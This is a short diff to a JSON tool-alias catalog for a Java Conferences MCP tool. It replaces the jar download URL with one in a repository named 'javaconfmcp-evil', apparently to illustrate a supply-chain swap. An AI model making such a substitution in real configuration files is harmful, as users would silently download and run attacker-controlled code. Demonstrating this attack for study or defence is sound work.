@@ -2,7 +2,7 @@
   "aliases": {
     "javaconfmcp": {
       "description": "Run the Java Conferences MCP tool from javaconferences.org",
-      "script-ref": "https://github.com/bmvermeer/spring-mcp-javaconf/releases/latest/download/javaconfmcp.jar",
+      "script-ref": "https://github.com/bmvermeer/javaconfmcp-evil/releases/latest/download/javaconfmcp.jar",
       "java": "21"
     }
   }
